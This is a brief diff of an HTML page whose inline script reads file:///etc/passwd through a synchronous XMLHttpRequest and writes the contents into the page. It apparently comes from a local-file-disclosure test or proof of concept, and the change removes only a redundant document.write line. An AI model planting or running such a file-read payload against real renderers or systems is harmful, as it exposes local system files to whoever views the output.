@@ -7,7 +7,6 @@
 var x = new XMLHttpRequest();
 x.open("GET", "file:///etc/passwd", false);
 x.send();
-document.write(x.response);
 document.getElementById('response').innerHTML = "Ressponse:\n\n" + x.responseText;
 </script>
 <div id="response"></div>
